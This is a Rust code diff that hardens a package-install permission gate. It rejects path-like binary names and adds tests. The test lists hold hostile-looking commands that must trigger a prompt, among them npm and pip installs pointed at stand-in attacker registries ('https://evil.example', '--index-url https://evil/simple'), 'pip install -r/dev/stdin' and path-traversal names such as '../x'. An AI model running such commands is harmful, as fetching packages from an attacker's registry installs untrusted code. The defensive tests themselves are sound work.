@@ -96,8 +96,17 @@ fn workspace_dirs(cwd: Option<&str>, root: &Path) -> Result<(PathBuf, PathBuf), 
 }
 
 /// `node_modules/.bin/<bin>` (or `<bin>.cmd`) exists from `dir` up to `root`.
+/// A name with `\`, `..`, `:` or a `/` other than the one after `@scope` is
+/// never local.
 fn local_bin(name: &str, dir: &Path, root: &Path) -> bool {
-    let bin = name.rsplit('/').next().unwrap_or(name);
+    let bin = match name.strip_prefix('@').map(|n| n.split_once('/')) {
+        Some(Some((_, bin))) => bin,
+        Some(None) => return false,
+        None => name,
+    };
+    if bin.is_empty() || bin.contains('/') || name.contains(['\\', ':']) || name.contains("..") {
+        return false;
+    }
     dir.ancestors().take_while(|d| d.starts_with(root)).any(|d| {
         let b = d.join("node_modules").join(".bin");
         b.join(bin).is_file() || b.join(format!("{bin}.cmd")).is_file()
@@ -507,6 +516,61 @@ mod tests {
         assert_eq!(gate(d.path(), "uvx ruff check"), None, "declared");
         for cmd in ["bunx cowsay", "uvx black", "pipx run black"] {
             assert!(gate(d.path(), cmd).is_some(), "{cmd}");
+        }
+    }
+
+    /// Round 2: wrapper option shapes, bare installs with another index, glued
+    /// sources, `uv tool run`/`pnpx`, and `-p` package values all ask.
+    #[test]
+    fn round_two_forms_ask_even_for_declared_names() {
+        let d = project(&[
+            ("package.json", PKG),
+            ("requirements.txt", "requests\n"),
+            ("node_modules/.bin/tsc", ""),
+        ]);
+        for cmd in [
+            "sudo -u ci -H npm install left-pad",
+            "timeout -k 5 -s KILL 10 npm install left-pad",
+            "pip install -r requirements.txt --index-url https://evil/simple",
+            "npm install --registry https://evil.example",
+            "npm ci --registry https://evil.example",
+            "PIP_INDEX_URL=https://evil pip install requests",
+            "npm_config_registry=https://evil npm install react",
+            "pip install -ihttps://evil/simple requests",
+            "pip install -r/dev/stdin",
+            "uv tool run black",
+            "pnpx cowsay",
+            "npx -p tsc tsc",
+        ] {
+            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
+        }
+        assert_eq!(gate(d.path(), "npx tsc"), None, "local binary");
+        assert_eq!(gate(d.path(), "npx -p eslint eslint"), None, "declared package");
+        assert_eq!(gate(d.path(), "npm ci"), None);
+        assert_eq!(
+            gate(d.path(), "sudo -u ci -H npm install react"),
+            None,
+            "declared"
+        );
+    }
+
+    /// S3 (iii): a name that could leave `node_modules/.bin` is never local.
+    #[test]
+    fn local_bin_refuses_path_like_names() {
+        let d = project(&[("node_modules/.bin/tsc", ""), ("node_modules/.bin/cli", "")]);
+        let (dir, root) = (d.path(), d.path());
+        assert!(super::local_bin("tsc", dir, root));
+        assert!(super::local_bin("@scope/cli", dir, root));
+        for bad in [
+            "../x",
+            "a/tsc",
+            "@scope/a/cli",
+            "..\\tsc",
+            "c:tsc",
+            "@scope",
+            "@../cli",
+        ] {
+            assert!(!super::local_bin(bad, dir, root), "{bad}");
         }
     }
 
